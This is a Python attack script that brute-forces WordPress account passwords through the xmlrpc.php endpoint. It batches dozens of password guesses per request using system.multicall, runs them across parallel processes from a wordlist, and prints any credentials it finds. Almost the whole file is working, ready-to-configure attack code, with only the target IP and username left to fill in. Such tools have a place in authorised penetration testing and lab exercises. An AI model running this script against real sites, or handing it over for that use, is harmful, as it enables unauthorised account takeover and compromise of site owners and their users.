#!/usr/bin/env python3

# [Description]
#        Brute force WordPress login via xmlrpc.php

# [Requires]
#        - a valid user (verify at wp-login.php via "lost password")

# [Usage]
#        1) set the ip, user and if necessary the xmlrpc.php path
#        2) run the script with a wordlist as argument

# [Author]
#        @crackcat

from multiprocessing import Pool
import requests
import sys
from  xml.etree import ElementTree

#======[CONFIG]======

ip   = '10.10.10.10' # change me
user = 'username' # change me

# defaults
port = '80'
path = '/xmlrpc.php'

stride = 40  # passwords per request
processes = 5

#====================

description = '''
 This python3 script aims to leverage "xmlrpc.php" of a
 WordPress website to brute force a password for a user.
                                               @crackcat
                                               
 Details: https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/                                                                                           
 
'''

pool = None
finished = 0
tasks = 0
url = f'http://{ip}:{port}{path}'

class fc:
        cyan = '\033[96m'
        green = '\033[92m'
        orange = '\033[93m'
        red = '\033[91m'
        end = '\033[0m'
        bold = '\033[1m'

def verify_vuln():
        xml = '''
        <?xml version="1.0" encoding="utf-8"?>
        <methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>
        '''
        try:
                ret = requests.post(url, data=xml, timeout=5)
        except:
                print(f'{fc.red}[+]{fc.end} {fc.red}Failed{fc.end} to connect.')
                sys.exit(0)
        if 'Hello!' in ret.text:
                print(f'{fc.green}[+] Success.{fc.end} XMLRPC reacts to queries.')
                return True
        else:
                print(f'{fc.red}[+]{fc.end} This XMLRPC is {fc.orange}probably not vulnerable{fc.end} (demo.sayHello is deactivated).')
                # we could check all available methods manually with this command line (but it's likely to return nothing)
                # curl -X POST http://<ip>/xmlrpc.php --data-binary "<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
                return False

def send_passwords(passwords):
        prefix = '''
        <?xml version="1.0"?>
        <methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
        '''
        bfform = ''
        for pw in passwords:
                bfform += f'<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{user}</string></value><value><string>{pw}</string></value></data></array></value></data></array></value></member></struct></value>'
        postfix = '''
        </data></array></value></param></params></methodCall>
        '''

        response = None
        payload = prefix + bfform + postfix
        response = requests.post(url, data=payload)
        return [passwords, response.text]

def get_creds(response, pwlist):
        tree = ElementTree.fromstring(response)
        i = 0
        # <methodResponse>-<params>-<param>-<value>-<array>-<data>
        for e in tree[0][0][0][0][0]: # <value>
                # <struct>-<member>-<name>.text
                name = e[0][0][0].text
                if name != 'faultCode':
                        return pwlist[i]
                i +=1
        return '<failed to extract password>'

def callback(response):
        global pool
        global finished
        global tasks

        data = response[1]

        finished += 1

        if data.count('Incorrect') == stride:
                print(f'{fc.cyan}[-]{fc.end} [{fc.cyan}{finished}{fc.end}/{fc.cyan}{tasks}{fc.end}] Requests (tested {fc.cyan}~{finished*stride}{fc.end} {fc.red}incorrect{fc.end} passwords)', end='\r')
        else:
                finalpw = get_creds(data, response[0])
                if finalpw != '<failed to extract password>':
                        print()
                        print(f'{fc.green}[+] FOUND CREDENTIALS: {user}{fc.end}:{fc.green}{finalpw}{fc.end}')
                        print(f'{fc.cyan}[+]{fc.end} Stopping all workers...')
                        pool.terminate()

def main(wordlist):
        global pool
        global finished
        global tasks

        print(f'{fc.cyan}[+]{fc.end} Checking [{fc.orange}{url}{fc.end}] ...')
        if not verify_vuln():
                print(f'{fc.red}[+]{fc.end} Shutting down.')
                sys.exit(0)

        # latin1 supports most common wordlists (including rockyou.txt)
        with open(wordlist, 'r', encoding='latin1') as inp:
                allpasses = inp.readlines()

        allpasses = [p.strip('\n') for p in allpasses] # strip newlines

        total = len(allpasses)

        # xmlrpc allows for multiple passwords at once, so split the list into small lists
        passlist = []
        for i in range(0, total, stride):
                passlist.append(allpasses[i:i+stride])

        # total requests that have to be made
        tasks = len(passlist)

        print(f'{fc.cyan}[+]{fc.end} Loaded [{fc.cyan}{total}{fc.end}] passwords')
        print(f'{fc.green}[+]{fc.end} Configuration:')
        print(f'      - [{fc.green}user{fc.end}     ] {fc.orange}{user}{fc.end}')
        print(f'      - [{fc.green}wp-url{fc.end}   ] {fc.orange}{url}{fc.end}')
        print(f'      - [{fc.green}wordlist{fc.end} ] {fc.orange}{wordlist}{fc.end}')
        print(f'      - [{fc.green}pass/req{fc.end} ] {fc.orange}{stride}{fc.end}')
        print(f'      - [{fc.green}requests{fc.end} ] {fc.orange}{tasks}{fc.end} ')
        print(f'      - [{fc.green}processes{fc.end}] {fc.orange}{processes}{fc.end}')
        print(f'{fc.cyan}[+]{fc.end} Start brute forcing...')

        finished = 0

        try:
                with Pool(processes=processes) as pool:
                        requests = []
                        for passwords in passlist:
                                requests.append(pool.apply_async(send_passwords, args=(passwords,), callback=callback))

                        pool.close() # accept no more jobs
                        pool.join() # wait for all jobs to finish
        except:
                print()
                print(f'{fc.red}Aborted{fc.end}')
                sys.exit(0)
        print()
        print(f'{fc.cyan}[+]{fc.end} Finished')


if __name__ == '__main__':
        print(description)

        if user == '' or ip == '':
                print(f'Configure ip and username first...')
                sys.exit(0)

        if len(sys.argv) != 2:
                print(f'Usage: {sys.argv[0]} <wordlist>')
                sys.exit(0)

        main(sys.argv[1])
